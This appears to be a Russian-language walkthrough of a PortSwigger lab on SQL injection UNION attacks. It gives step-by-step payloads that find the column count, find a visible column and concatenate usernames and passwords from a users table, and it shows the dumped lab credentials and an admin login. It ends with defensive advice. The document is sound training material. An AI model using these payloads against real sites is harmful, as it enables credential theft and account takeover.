# 📘 PortSwigger Lab: SQL injection UNION attack, retrieving multiple values in a single column

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-single-column

---

# 📑 Оглавление

- [🎯 Цель](#goal)
- [🧠 Идея атаки](#idea)
- [🏗 Что уже известно](#how)
- [🔍 Шаг 1 — Определение количества колонок](#step1)
- [🔍 Шаг 2 — Поиск string column](#step2)
- [🔍 Шаг 3 — Concatenation](#step3)
- [🔍 Шаг 4 — Получение credentials](#step4)
- [🔍 Шаг 5 — Login as administrator](#step5)
- [💥 Почему атака сработала](#why)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Получить usernames и passwords из таблицы `users` через одну колонку и войти как `administrator`.

---

<a id="idea"></a>

# 🧠 Идея атаки

Иногда visible column только одна.

В таком случае:
- username;
- password;

нужно склеить в одну строку.

---

# Пример

```text
administrator~secret123
```

---

<a id="how"></a>

# 🏗 Что уже известно

Лаба уже сообщает:

```text
table = users
columns = username,password
```

Нужно:
1. определить количество колонок;
2. найти visible string column;
3. объединить username/password через concatenation.

---

<a id="step1"></a>

# 🔍 Шаг 1 — Определение количества колонок

```sql
UNION SELECT NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL--
```

✅ Success

---

# Вывод

Оригинальный SELECT содержит:
# 2 колонки

---

<a id="step2"></a>

# 🔍 Шаг 2 — Поиск string column

```http
/filter?category=Accessories' UNION SELECT NULL,'test'--
```

✅ Строка появилась на странице

---

# Вывод

Вторая колонка:
- string-compatible;
- visible.

---

<a id="step3"></a>

# 🔍 Шаг 3 — Concatenation

Payload:

```http
/filter?category=Accessories' UNION SELECT NULL,username || '~' || password FROM users--
```

---

# Что делает ||

Склеивает строки.

---

# Что делает ~

Разделяет:
- username;
- password.

---

<a id="step4"></a>

# 🔍 Шаг 4 — Получение credentials

Приложение показало:

```text
administrator~secret123
carlos~montoya
```

и другие credentials пользователей.

---

<a id="step5"></a>

# 🔍 Шаг 5 — Login as administrator

Открываем:

```text
/login
```

Используем:
- username = administrator
- password = найденный password

---

# Результат

Успешный вход в administrator account.

Лаба была решена.

---

<a id="why"></a>

# 💥 Почему атака сработала

Потому что приложение:
- вставляло input напрямую в SQL;
- не использовало prepared statements;
- отображало SQL results пользователю.

---

<a id="defense"></a>

# 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- WAF

Безопасный пример:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Чеклист

- [ ] найден SQL Injection
- [ ] найдено количество колонок
- [ ] найден visible string column
- [ ] выполнен concatenation
- [ ] получены usernames/passwords
- [ ] выполнен login как administrator

---

# ⬆ Наверх

[Вернуться к началу](#top)
